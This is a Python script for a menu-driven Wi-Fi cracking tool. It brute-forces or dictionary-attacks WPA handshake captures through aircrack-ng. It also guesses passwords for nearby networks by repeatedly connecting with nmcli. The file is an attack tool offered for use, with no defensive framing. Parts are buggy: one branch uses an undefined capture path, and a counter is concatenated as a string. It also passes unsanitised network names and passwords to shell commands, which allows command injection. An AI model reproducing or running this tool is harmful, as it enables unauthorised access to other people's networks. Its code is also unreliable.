import os
import netifaces
import subprocess
import itertools

def wpa_brute():
    os.system("clear")
    print("  ------------\n |Airpy-Brute | \n  ------------")
    valid = False
    cap = input("[ENTER] enter path to cap file [eg: /home/user/captures/wifi_101.cap] \n----> ")
    while not valid:
        try:
            open(cap,"rb")
            valid = True
        except Exception:
            os.system("clear")
            print("[!] enter a valid file!")
            cap = input("[ENTER] enter path to cap file [eg: /home/user/captures/wifi_101.cap] \n----> ")
    min_len = int(input("[ENTER] enter minumium password lentgh: "))
    max_len = int(input("[ENTER] enter maxmimum password: "))
    chars = input("[ENTER] enter the chars to use [eg: 1248sfuhr] \n----> ")
    max_len = max_len + 1
    xx = 0
    input("[ctrl+c] press ctrl+c to quit \n[ENTER] run? ")
    try:
        while min_len != max_len:
            PASSWORD_LIST = itertools.product(chars, repeat=min_len) #0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM
            for pas in PASSWORD_LIST:
                pas = str(pas)
                pas = pas.replace("')","")
                pas = pas.replace("('","")
                pas = pas.replace("'","")
                pas = pas.replace(",","")
                pas = pas.replace(" ","")
                file = open("words.txt","r+")
                pa = str(pas)
                print("[WPA] attempt num: ", xx)
                print("[WPA] attempting: ",pa)
                file.write(pa)
                file.close()
                command = "aircrack-ng -a2 -w words.txt "+cap
                res = subprocess.run(command, shell=True, capture_output=True, text=True)
                n = res.stdout
                n = str(n)
                if "KEY FOUND!" in n:
                    print("[WPA] key: ",pa)
                    input("[ENTER] Key Found! ")
                else:
                    pass
                print(n)
                subprocess.run("clear", shell=True)
                xx = xx + 1
            min_len = min_len + 1
    except KeyboardInterrupt:
        subprocess.run("clear", shell=True)
        print("[!] last password: ",pa)
        print("[!] attempts: ", xx)
        input("[ENTER] continue? ")

def wpa_aircrack():
    banner = """

    =============================
    __      __  ____           _ 
    \ \    / / |  _ |  /\     | | 
     \ \/\/ /  |  __| /__\    |_|
      \    /   | |   / __ \    _
       \/\/    |_|  /_/  \_\  |_|
    
    ==========[cracker]==========

    """
    print(banner)
    print("""
    1) airpy
    2) diconery
    """)
    cho = int(input("[ENTER] enter choice: "))
    os.system("clear")
    if cho == 1:
        wpa_brute()
    elif cho == 2:
        os.system("clear")
        valid = False
        while not valid:
            try:
                open(cap,"rb")
                valid = True
            except Exception:
                os.system("clear")
                print("[!] enter a valid file!")
                cap = input("[ENTER] enter path to cap file [eg: /home/user/captures/wifi_101.cap] \n----> ")
        words = input("[ENTER] enter wordlist path [eg: exapmle above] \n----> ")
        valid = False
        while not valid:
            try:
                open(words,"rb")
                valid = True
            except Exception:
                os.system("clear")
                print("[!] enter a valid file!")
                words = input("[ENTER] enter wordlist path [eg: exapmle above] \n----> ")

        command = "aircrack-ng -a2 -w "+ words + " " + cap
        res = subprocess.run(command, shell=True, capture_output=False, text=True)
        n = res.stdout
        n = str(n)
        if "FOUND!" in n:
            print("[WPA] password found!")
        else:
            pass

def ssid_attack():
    banner = """

===========================
__        __  _   ____   _ 
\ \  /\  / / |_| |  __| |_|
 \ \/  \/ /   _  | |__   _
  \  /\  /   | | |  __| | | 
   \/  \/    |_| |_|    |_|

========[WIFI SSID]========


    """

    print(banner)
    print("1) worlist")
    print("2) airbrute")
    cho = int(input("[ENTER] enter choice: "))
    
    i = netifaces.interfaces()
    for iface in i:
        print(iface)
    IFACE = input("\n\n[ENTER] enter iface name: ")


    print("[SSID] getting ssid's (may take severel seconds)")
    command = "nmcli dev wifi"
    res = subprocess.run(command, shell=True, capture_output=True, text=True)
    n = res.stdout
    n = str(n)
    n = n.split("\n")
    x = 0
    for g in n:
        if "IN-USE" in g or "--" in g or "*" in g:
            pass
        else:
            print(str(x)+") ",g)
        x = x + 1
    c = int(input("[ENTER] enter wifi num: "))

    l = n[c]
    l = l.split("  ")
    SSID = l[5]
    SSID = SSID.replace("\n","")

    if cho == 2:
        count = 0
        chars = "1234567890QWERTYUIOPASDFGHKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"
        for min_len in range(64):
            password = itertools.product(chars, repeat=min_len)
            l = itertools.product(chars, repeat=min_len)
            mx = len(list(l))
            for pas in password:
                count = count + 1
                pas = str(pas)
                pas = pas.replace("')","")
                pas = pas.replace("('","")
                pas = pas.replace("'","")
                pas = pas.replace(",","")
                pas = pas.replace(" ","")
                PSWD = str(pas)
                print("[SSID] attempt ("+str(count)+" / "+mx+")")
                command = 'nmcli d wifi connect "'+SSID+'" password '+PSWD+' ifname '+IFACE
                res = subprocess.run(command, shell=True, capture_output=True, text=True)
                n = res.stdout
                n = str(n)
                if "successfully" in n:
                    os.system("clear")
                    print(banner)
                    print("[SSID] got password!")
                    print("password: ", PSWD)
                    break
                else:
                    pass

    elif cho == 1:
        file = input("[ENTER] enter wordlist: ")
        words = open(file,"r").readlines()

        os.system("clear")

        print(banner)
        print("[SSID] attacking "+SSID)

        mx = str(len(words))
        count = 0

        for PSWD in words:
            print("[SSID] attempt ("+str(count)+" / "+mx+")")
            command = 'nmcli d wifi connect "'+SSID+'" password '+PSWD+' ifname '+IFACE
            res = subprocess.run(command, shell=True, capture_output=True, text=True)
            n = res.stdout
            n = str(n)
            if "successfully" in n:
                os.system("clear")
                print(banner)
                print("[SSID] got password!")
                print("password: ", PSWD)
                break
            else:
                pass

def main():
    banner = """
===========================
__        __  _   ____   _ 
\ \  /\  / / |_| |  __| |_|
 \ \/  \/ /   _  | |__   _
  \  /\  /   | | |  __| | | 
   \/  \/    |_| |_|    |_|

========[WIFI MAIN]========

    """
    print(banner)
    print("1) ssid password login (no extra tools needed only linux)")
    print("2) WPA cracker (aircrack-ng needed) ")
    cho = int(input("[ENTER] enter option: "))
    os.system("clear")
    if cho == 1:
        ssid_attack()
    else:
        wpa_aircrack()